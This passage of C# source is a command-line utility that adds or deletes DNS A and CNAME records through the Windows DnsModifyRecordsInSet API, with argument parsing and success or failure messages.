         switch(RType)
         {
            case "A":
               domain = RHost + "." + RDomain;
               rec = new DNS_RECORD();
               rec.pNext = IntPtr.Zero;
               rec.pName = domain;
               rec.wType = 1;
               rec.wDataLength = 4;
               rec.dwTtl = (uint)Convert.ToInt32(RTTL);
               rec.dwReserved = 0;
               var addr = IPAddress.Parse(RTarget);
               ipv4 = (uint)BitConverter.ToInt32((addr.GetAddressBytes()), 0);
               rec.Data.A.IpAddress = ipv4;
               pRec = Marshal.AllocHGlobal(Marshal.SizeOf(rec));
               Marshal.StructureToPtr(rec, pRec, false);
               r = DnsModifyRecordsInSet(pRec, IntPtr.Zero, 0, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
               if(r)
               {
                  Console.WriteLine("Failed to add DNS 'A' record.");
               }
               else
               {
                  Console.WriteLine("DNS 'A' record added successfully.");
               }
               break;
            case "CNAME":
               domain = RHost + "." + RDomain;
               rec = new DNS_RECORD();
               rec.pNext = IntPtr.Zero;
               rec.pName = domain;
               rec.wType = 5;
               rec.wDataLength = (ushort)System.Runtime.InteropServices.Marshal.SizeOf(typeof(DNS_PTR_DATA));
               rec.dwTtl = (uint)Convert.ToInt32(RTTL);
               rec.dwReserved = 0;
               rec.Data.CNAME.pNameHost = Marshal.StringToHGlobalAnsi(RTarget);
               pRec = Marshal.AllocHGlobal(Marshal.SizeOf(rec));
               Marshal.StructureToPtr(rec, pRec, false);
               r = DnsModifyRecordsInSet(pRec, IntPtr.Zero, 0, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
               if(r)
               {
                  Console.WriteLine("Failed to add DNS 'CNAME' record.");
               }
               else
               {
                  Console.WriteLine("DNS 'CNAME' record added successfully.");
               }
               break;
            default:
               Usage();
               break;
         }
      }
      private static void DelRec(string RType, string RDomain, string RHost, string RTarget)
      {
         string domain;
         DNS_RECORD rec;
         uint ipv4;
         IntPtr pRec;
         bool r;
         switch(RType)
         {
            case "A":
               domain = RHost + "." + RDomain;
               rec = new DNS_RECORD();
               rec.pNext = IntPtr.Zero;
               rec.pName = domain;
               rec.wType = 1;
               rec.wDataLength = 4;
               rec.dwReserved = 0;
               var addr = IPAddress.Parse(RTarget);
               ipv4 = (uint)BitConverter.ToInt32((addr.GetAddressBytes()), 0);
               rec.Data.A.IpAddress = ipv4;
               pRec = Marshal.AllocHGlobal(Marshal.SizeOf(rec));
               Marshal.StructureToPtr(rec, pRec, false);
               r = DnsModifyRecordsInSet(IntPtr.Zero, pRec, 0, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
               if(r)
               {
                  Console.WriteLine("Failed to delete DNS 'A' record.");
               }
               else
               {
                  Console.WriteLine("DNS 'A' record deleted successfully.");
               }
               break;
            case "CNAME":
               domain = RHost + "." + RDomain;
               rec = new DNS_RECORD();
               rec.pNext = IntPtr.Zero;
               rec.pName = domain;
               rec.wType = 5;
               rec.wDataLength = (ushort)System.Runtime.InteropServices.Marshal.SizeOf(typeof(DNS_PTR_DATA));
               rec.dwReserved = 0;
               rec.Data.CNAME.pNameHost = Marshal.StringToHGlobalAnsi(RTarget);
               pRec = Marshal.AllocHGlobal(Marshal.SizeOf(rec));
               Marshal.StructureToPtr(rec, pRec, false);
               r = DnsModifyRecordsInSet(IntPtr.Zero, pRec, 0, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
               if(r)
               {
                  Console.WriteLine("Failed to delete DNS 'CNAME' record.");
               }
               else
               {
                  Console.WriteLine("DNS 'CNAME' record deleted successfully.");
               }
               break;
            default:
               Usage();
               break;
         }
      }
      private static void Main(string[] args)
      {
         try
         {
            if(args.Length < 1)
            {
               Usage();
            }
            else
            {
               switch(args[0])
               {
                  case "add":
                     if(args.Length == 6)
                     {
                        AddRec(args[1], args[2], args[3], args[4], args[5]);
                     }
                     else
                     {
                        Usage();
                     }
                     break;
                  case "del":
                     if(args.Length == 5)
                     {
                        DelRec(args[1], args[2], args[3], args[4]);
                     }
                     else
                     {
                        Usage();
                     }
                     break;
                  default:
                     Usage();
                     break;
               }
            }
         }
         catch(Exception)
         {
         }
      }
   }
}
```
